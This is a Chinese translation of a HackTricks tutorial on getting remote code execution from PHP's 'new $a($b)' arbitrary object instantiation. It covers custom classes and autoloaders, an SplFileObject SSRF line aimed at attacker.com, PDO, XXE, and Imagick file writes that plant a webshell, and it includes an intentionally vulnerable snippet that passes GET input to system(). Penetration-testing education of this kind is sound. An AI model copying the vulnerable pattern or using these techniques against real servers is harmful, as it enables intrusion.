# PHP - 利用对象创建实现远程代码执行：new $\_GET\["a"]\($\_GET\["b"])

<details>

<summary><strong>从零开始学习AWS黑客攻击直到成为专家，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

支持HackTricks的其他方式：

* 如果你想在**HackTricks中看到你的公司广告**或者**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享你的黑客技巧。

</details>

## 引言

在你可以创建一个新的任意对象，如 `new $_GET["a"]($_GET["a"])` 的情况下，你可能能够实现远程代码执行(RCE)，并且[**这篇文章**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)揭示了不同的获取RCE的方法。

## 通过自定义类或自动加载实现RCE

在构造 `new $a($b)` 中，**变量 `$a` 代表将要创建对象的类名**，而变量 **`$b` 代表将传递给对象构造函数的第一个参数**。

如果 `$a` 和 `$b` 来自GET/POST，它们可以是**字符串或字符串数组**。如果它们来自 **JSON** 或其他地方，它们**可能有其他类型**，如对象或布尔值。

让我们考虑以下示例：
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

# Additionally, in PHP < 8.0 a constructor might be defined using the name of the class
class App2 {
function App2 ($cmd) {
system($cmd);
}
}

# Vulnerable code
$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
在这段代码中，你可以将 `$a` 设置为 `App` 或 `App2`，将 `$b` 设置为 `uname -a`。之后，命令 `uname -a` 将被执行。

当你的应用程序中没有这样的可利用类，或者你需要的类在一个不被易受攻击代码包含的单独文件中时，你可以考虑使用自动加载函数。

**自动加载函数** 是通过注册回调函数 `spl_autoload_register` 或定义 `__autoload` 来设置的。当尝试创建一个未知类的实例时，它们会被调用。
```php
# An example of an autoloading function
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

# An example of an autoloading function, works only in PHP < 8.0
function __autoload($class_name) {
include $class_name . '.php';
};

# Calling spl_autoload_register with no arguments enables the default autoloading function, which includes lowercase($classname) + .php/.inc from include_path
spl_autoload_register();
```
取决于PHP版本和自动加载函数中的代码，可能存在通过自动加载实现远程代码执行的方法。

## 通过内置类实现RCE

当你没有自定义类和自动加载时，你可以**仅依赖PHP内置类**。

PHP内置类的数量在100到200个之间。它们的数量取决于PHP版本和已安装的扩展。所有内置类可以通过`get_declared_classes`函数列出，自定义类也是如此：
```php
var_dump(get_declared_classes());
```
通过[反射 API](https://www.php.net/manual/en/book.reflection.php)可以找到具有有用构造函数的类。

使用反射 API 显示构造函数及其参数：[https://3v4l.org/2JEGF](https://3v4l.org/2JEGF)

![](https://swarm.ptsecurity.com/wp-content/uploads/2022/07/2.png)

如果你能控制**多个构造函数参数并且之后可以调用任意方法**，那么有很多方法可以获得远程代码执行。但如果你只能传递**一个参数并且没有对创建的对象进行任何调用**，那么几乎**没有什么**。

我只知道从 `new $a($b)` 获取某些东西的三种方法。

### **SSRF + Phar 反序列化**

`SplFileObject` 类实现了一个构造函数，允许连接到任何本地或远程 URL：
```
new SplFileObject('http://attacker.com/');
```
这允许SSRF。此外，在PHP < 8.0中，SSRF可以通过使用Phar协议的技术转变为反序列化。

### **利用PDOs**

PDO类有另一个有趣的构造函数：
```php
new PDO("sqlite:/tmp/test.txt")
```
`PDO` 构造函数接受 DSN 字符串，允许我们**连接到任何本地或远程数据库**，使用**已安装的数据库扩展**。例如，SQLite 扩展可以创建空文件。

### **SoapClient/SimpleXMLElement XXE**

在 PHP ≤ 5.3.22 和 ≤ 5.4.12 中，SoapClient 的构造函数**容易受到 XXE 攻击**。SimpleXMLElement 的构造函数也容易受到 XXE 攻击，但它需要 libxml2 < 2.9。

## 通过 Imagick 扩展实现 RCE

检查你试图利用的**项目**的**依赖项**，你可能会发现**新的类**，这些类可以**被滥用来执行命令**，通过创建一个新对象。在这种情况下，发现 **Imagick** 对于这个目的很有用。

### VID 解析器

VID 解析器允许在文件系统内的任意路径写入任意内容，这将允许攻击者在网页可访问的文件夹中写入 PHPshell 并获得 RCE。

![](<../../../.gitbook/assets/image (157) (3).png>)

#### VID 解析器 + 文件上传

当文件上传到 PHP 时，它会暂时存储在 `/tmp/phpXXXXXX`。Imagick 的 VID 解析器使用 **msl** 协议允许**在文件路径中指定通配符**（因此可以轻松访问临时上传的文件）并**将其复制到任意位置**。\
这是在文件系统内获得任意文件写入的另一种方式：

![](<../../../.gitbook/assets/image (159).png>)

### PHP 崩溃 + 暴力破解

[**原始的写作**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) 解释了另一种通过**上传具有特定内容的文件**并在服务器崩溃之前**删除**该文件，然后**暴力破解**临时文件的名称，直到 **Imagick 执行任意 PHP 代码**的方法来获得 RCE。

然而，显然发现的**崩溃技巧**只**在 ImageMagick 的旧版本中有效**。

## 参考资料

* [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

<details>

<summary><strong>从零开始学习 AWS 黑客攻击直到成为专家，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果你想在 HackTricks 中看到你的**公司广告**或**下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来**分享你的黑客技巧**。

</details>
